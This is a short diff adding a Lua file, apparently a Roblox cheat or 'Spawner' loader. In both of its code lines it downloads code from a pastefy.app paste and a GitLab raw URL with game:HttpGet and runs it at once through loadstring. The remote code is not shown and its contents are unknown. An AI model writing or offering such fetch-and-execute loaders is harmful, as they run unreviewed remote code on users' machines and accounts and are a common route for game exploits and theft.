@@ -1,0 +1,6 @@
+-- Load the first script
+loadstring(game:HttpGet("https://pastefy.app/nVTcJm0c/raw", true))()
+
+-- Load Spawner and return it
+local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua", true))()
+return Spawner
